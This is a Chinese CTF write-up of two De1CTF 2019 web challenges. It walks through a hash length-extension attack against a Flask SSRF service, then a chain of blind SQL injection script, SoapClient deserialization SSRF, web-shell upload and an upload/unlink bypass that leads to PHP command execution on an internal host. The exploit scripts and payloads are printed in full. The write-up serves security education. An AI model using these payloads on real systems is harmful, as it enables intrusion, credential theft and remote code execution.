#　前言

2019年的DeCTF复现....

 # SSRFme

提供源码

```python
#! /usr/bin/env python
#encoding=utf-8
from flask import Flask
from flask import request
import socket
import hashlib
import urllib
import sys
import os
import json
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)

secert_key = os.urandom(16)


class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {}
        result['code'] = 500
        if (self.checkSign()):
            if "scan" in self.action:
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w')
                resp = scan(self.param)
                if (resp == "Connection Timeout"):
                    result['data'] = resp
                else:
                    print resp
                    tmpfile.write(resp)
                    tmpfile.close()
                result['code'] = 200
            if "read" in self.action:
                f = open("./%s/result.txt" % self.sandbox, 'r')
                result['code'] = 200
                result['data'] = f.read()
            if result['code'] == 500:
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        if (getSign(self.action, self.param) == self.sign):
            return True
        else:
            return False


#generate Sign For Action Scan.
@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)


@app.route('/De1ta',methods=['GET','POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if(waf(param)):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())
@app.route('/')
def index():
    return open("code.txt","r").read()


def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"



def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()


def md5(content):
    return hashlib.md5(content).hexdigest()


def waf(param):
    check=param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    else:
        return False


if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0',port=80)

```

FLASK的框架，给了提示，说是flag在flag.txt

`geneSign()`调用`getSign()`拼接`秘钥＋param+action`，生成sign,在`/geneSign`，我们可获得sign，`/De1ta`调用`Task::EXEC()`，这里提供的`scan`用于将param指定的文件写入result.txt，这里提供的`read`用于读取param指定的文件。

已知密文长度，并且一直密文，还知道加密规则，考察hash拓展攻击

```php
/geneSign?param=local-file:flag.txt
```

获得sign：`24efa347d32d4e10bdd25ed88d6364e7`



伪造sign：

```php
hashpump -s 24efa347d32d4e10bdd25ed88d6364e7 -d local-file:flag.txtscan -a read -k 16
3763fc3c87f9bb1f46c0bd6b8b759a2d
local-file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read



3763fc3c87f9bb1f46c0bd6b8b759a2d
local-file:flag.txtscan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read
```



payload:

```php
GET /De1ta?param=local-file:flag.txt HTTP/1.1
Host: f5bd1e63-bd41-401f-aefa-cfa545ec4871.node2.buuoj.cn.wetolink.com:82
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cookie: action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read; sign=3763fc3c87f9bb1f46c0bd6b8b759a2d

```



response:

```php
HTTP/1.1 200 OK
Server: openresty
Date: Fri, 27 Sep 2019 06:29:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 69
Connection: close

{"code": 200, "data": "flag{a1368758-4c60-42a0-8c98-3d519ae53f21}\n"}
```





# shellshellshell

![](/home/cookie/Pictures/blogs/2019DeCTF/1.png)

这道题复现了很久，太不容易了，主要还是在于代码审计太烂...

这里存在源码泄露，使用脚本

```python
#coding=utf-8
#import requests
import urllib
import os
os.system('mkdir source')
os.system('mkdir source/views')
file_list=['.index.php~','.config.php~','.user.php~','user.php.bak','views/delete','views/index','views/login','views/logout','views/profile','views/publish','views/register']
part_url='http://127.0.0.1:8302/'
for i in file_list:
    url=part_url+i
    print 'download %s '% url
    os.system('curl '+url+'>source/'+i)
```

## 第一步

得到源码，在`./user.php::publish()`

```php
    function publish()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            if(isset($_POST['signature']) && isset($_POST['mood'])) {

                $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
                $db = new Db();
                @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
                echo "hello world";
                if($ret)
                    return true;
                else
                    return false;
            }
        }
        else
        {
                if(isset($_FILES['pic'])) 
                {
                    $dir='/app/upload/';
                    move_uploaded_file($_FILES['pic']['tmp_name'],$dir.$_FILES['pic']['name']);
                    echo "<script>alert('".$_FILES['pic']['name']."upload success');</script>";
                    return true;
                }
                else
                    return false;


        }
    }
```

这段代码是解题的关键，其中我们跟进

```php
@$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
```

这里就是publish页面上的发表signature的功能，我们写的signature将会插入到数据库中。然后我们跟进`insert()`这个函数。

```php
    public function insert($columns,$table,$values){

        $column = $this->get_column($columns);
        $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
        $nid =
        $sql = 'insert into '.$table.'('.$column.') values '.$value;
        echo "<br>";
        $result = $this->conn->query($sql);

        return $result;
    }
```

再跟进`get_column()`

```php
    private function get_column($columns){

        if(is_array($columns))
            $column = ' `'.implode('`,`',$columns).'` ';
        else
            $column = ' `'.$columns.'` ';

        return $column;
    }
```

`get_column()`这个函数的作用就是将我们插入到数据库的数据两边加上**"`"**

```markdown
insert into table values (`xxx`,`xxx`,`xxx`,`xxx`);
```

然后跟进到代码

```php
$value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
```

这段代码会将上述的sql语句改成

```sql
insert into table values ('xxx','xxx','xxx','xxx');
```

这个正则匹配是有问题

```php
<?php   
 
 $str = "`123`";
 $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$str).')';
 echo $value;
 echo "\n";
 $str2 = "`123`and database()#`";
 $value2 = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$str2).')';
 echo $value2;

?>
```

这段代码返回的结果如下：

```php
('123')
('123'and database()#`)
```

我们可以看到这个正则有个弊端，在于他会匹配成对出现的反引号，实现单引号逃逸，那我们可以采用时间盲注，

注册一个账号，登录后，贴上这个账号的cookie值。

```python
#coding:utf-8
import  string
import binascii
import requests
import re
payloads = "0123456789abcdef"
url = "http://127.0.0.1:8302/index.php?action=publish"
cookie={"PHPSESSID":"9dts0888kles53oft7u5bh3c03"}

inject = requests.session()
password=""
def dump_flag():
    password=""
    for i in range(1,33):
        for payload in payloads:
            ch = ord(payload)
            data = {
                "signature": "111`,3),(if(ascii(substring((select password from ctf_users where username=0x61646d696e),"+str(i)+",1))="+str(ch)+",sleep(5),0),3,4,5)#",
                "mood": 0
            }
            try:
                a = inject.post(url=url,data=data,cookies=cookie,timeout=5)
                #print(data)
            except:
                password = password +  payload
                print(password)
                break

dump_flag()
```

爆出admin的md5(password)，然后使用解密一下，获得其密码为：jaivypassword。

## 第二步

用admin登录后发现，页面会说我们登录需要使用You can only login at the usual address。

看一下源码，为什么会出现这个问题。`./user.php::login()`

```php
    function login()
    {
        if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['code'])) {
            if(substr(md5($_POST['code']),0, 5)!==$_SESSION['code'])
            {
                die("code erroar");
            }
            $username = $_POST['username'];
            $password = md5($_POST['password']);
            if(!$this->check_username($username))
                die('Invalid user name');
            $db = new Db();
            @$ret = $db->select(array('id','username','ip','is_admin','allow_diff_ip'),'ctf_users',"username = '$username' and password = '$password' limit 1");

            if($ret)
            {

                $user = $ret->fetch_row();
                if($user) {
                    if ($user[4] == '0' && $user[2] !== get_ip())
                        die("You can only login at the usual address");
                    if ($user[3] == '1')
                        $_SESSION['is_admin'] = 1;
                    else
                        $_SESSION['is_admin'] = 0;
                    $_SESSION['userid'] = $user[0];
                    $_SESSION['username'] = $user[1];
                    $this->username = $user[1];
                    $this->userid = $user[0];
                    return true;
                }
                else
                    return false;

            }
            else
            {
                return false;
            }

        }
        else
            return false;
    }
```

关键代码在于:

```php
                    if ($user[4] == '0' && $user[2] !== get_ip())
                        die("You can only login at the usual address");
```

首先`$user[4]=='0'`，我们可以在数据库中看一下，因为我是用自建环境做的这道题，所以docker中看一下

```php
sudo docker ps //查看docker运行情况
sudo docker exec -it de1ctf2019webshellshellshellmaster_web_1 /bin/bash //进入docker环境
    
mysql -uNu1L -pNu1Lpassword233334; //进入数据库
>use nu1lctf;
>select * from ctf_users;
```

![](/home/cookie/Pictures/blogs/2019DeCTF/2.png)

这里唯独admin的`allow_diff_ip=0`。而`user[4]`就是`allow_diff_ip=0`。所以我们只能在`$user[2] !== get_ip()`做文章。

```php
function get_ip(){
    return $_SERVER['REMOTE_ADDR'];
}
```

这就是这里为什么需要使用SSRF的原因。然后如何触发这个SSRF呢？回到`./user.php::showmess()`

```php
    function showmess()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            //id,sig,mood,ip,country,subtime
            $db = new Db();
            @$ret = $db->select(array('username','signature','mood','id'),'ctf_user_signature',"userid = $this->userid order by id desc");
            if($ret) {
                $data = array();
                while ($row = $ret->fetch_row()) {
                    $sig = $row[1];
                    $mood = unserialize($row[2]);
                    $country = $mood->getcountry();
                    $ip = $mood->ip;
                    $subtime = $mood->getsubtime();
                    $allmess = array('id'=>$row[3],'sig' => $sig, 'mood' => $mood, 'ip' => $ip, 'country' => $country, 'subtime' => $subtime);
                    array_push($data, $allmess);
                }
   ... ...
```

触发点：

```php
$mood = unserialize($row[2]);//row[2]就是我们post的mood
```

哪里调用了showmess？在./view/index.php

```php
<?php
if(!$C->check_login())
{
    header('Location: index.php?action=login');
    exit;
}
$data = $C->showmess();
?>
```

showmess的数据来自于数据库，来自我们之前的insert()

```php
            if(isset($_POST['signature']) && isset($_POST['mood'])) {

                $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
                $db = new Db();
                @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
                echo "hello world";
                if($ret)
                    return true;
                else
                    return false;
```

其中正常情况下，我们插入的mood会被转成int类型，那么我们直接在上传时，burp抓包，修改mood值，是不可取的。我们得选择使用之前的sql注入，变相插入序列化文本，然后之后做反序列化处理。

由于是为了进行SSRF攻击，所以我们选择使用soapclient内置类，作为payload，打入内网。然后我们是要模拟admin在内网登录。打开一个浏览器，我们要带上code还有cookie值，生成序列化文本如下：

```php
<?php
$target = 'http://127.0.0.1/index.php?action=login';
$post_string = 'username=admin&password=jaivypassword&code=89760';
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=4kla6qhksreeadoi1jamoo9772'
    );
$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));

$aaa = serialize($b);
$aaa = str_replace('^^',"\r\n",$aaa);
$aaa = str_replace('&','&',$aaa);
echo bin2hex($aaa);
?>
```

生成payload后，在另外一个浏览器，注册账号，登录后，进行publish操作。

![](/home/cookie/Pictures/blogs/2019DeCTF/3.png)

这时候刷新浏览器，触发漏洞。然后在第一个停在登录页面处的浏览器，我们刷新一下，因为我们payload中的cookie来自于这个浏览器，模拟内网登录成功，跳到一个上传文件的页面，作为admin进行publish操作就会到

```php
                if(isset($_FILES['pic'])) 
                {
                    $dir='/app/upload/';
                    move_uploaded_file($_FILES['pic']['tmp_name'],$dir.$_FILES['pic']['name']);
                    echo "<script>alert('".$_FILES['pic']['name']."upload success');</script>";
                    return true;
                }
```

![](/home/cookie/Pictures/blogs/2019DeCTF/4.png)

上传shell。用antsword连接后，因为在内网中，才能打flag。查看`/proc/net/fib_trie`

```php
           /32 link BROADCAST
     +-- 172.18.0.0/15 2 0 1
        +-- 172.18.0.0/24 2 0 2
           +-- 172.18.0.0/30 2 0 2
              |-- 172.18.0.0
                 /32 link BROADCAST
                 /24 link UNICAST
              |-- 172.18.0.3
```

这里是一个C段网络，然后我一个个去试，在172.18.0.2的80端口是开着的，访问下载其index.html文件。

```php
curl -X POST http://172.18.0.2 -o index.html
```

```php
<?php
$sandbox = '/var/sandbox/' . md5("prefix" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);

if($_FILES['file']['name']){
    $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
    if(!is_array($filename)) {
        $filename = explode('.', $filename);
    }
    $ext = end($filename);
    if($ext==$filename[count($filename) - 1]){
        die("try again!!!");
    }
    $new_name = (string)rand(100,999).".".$ext;
    move_uploaded_file($_FILES['file']['tmp_name'],$new_name);
    $_ = $_POST['hello'];
    if(@substr(file($_)[0],0,6)==='@<?php'){
        if(strpos($_,$new_name)===false) {
            include($_);
        } else {
            echo "you can do it!";
        }
    }
    unlink($new_name);
}
else{
    highlight_file(__FILE__);
}
```



## 第三步

```php
    $ext = end($filename);
    if($ext==$filename[count($filename) - 1]){
        die("try again!!!");
    }
```

![](/home/cookie/Pictures/blogs/2019DeCTF/5.png)

可以看到$end返回的是最后一个输入的值，而$arr返回的是数组的最后一项。我们上传的文件可以这么绕过，这个waf。

另一个问题就是如何绕过unlink()

这里有个小trick。使用../或者./可以绕过这个函数

payload：

```php
curl 'http://172.18.0.2' -F file=@/var/tmp/ant.php -F file\[2]=cookie -F file\[1]=cookie -F file\[0]=/../shell.php -F hello=shell.php
    
ant.php
@<?php
  system('ls /etc');
  #system('cat /etc/flag_is_her444.txt');  
 ?>
```







